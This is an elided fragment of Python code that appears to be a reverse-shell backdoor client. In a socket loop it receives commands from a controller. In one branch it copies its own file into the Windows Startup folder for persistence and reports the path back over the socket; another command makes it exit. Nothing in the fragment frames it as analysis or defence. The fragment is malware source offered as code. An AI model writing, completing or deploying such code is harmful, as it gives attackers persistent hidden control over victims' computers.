...
from os import getcwd, chdir, environ, remove, path
...
def connection():
    ...
    while True:
        ...
        if cmd[:3] == "cd " and not cmd == "cd":
            ...
            startup = r"{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup".format(
                path.expanduser("~"))
            copy2(__file__, startup)
            response = ("File attached to startup of directory " + startup)
            response = (response + "\n" + getcwd())
            s.send(response)
        elif cmd == "close()":
            exit()
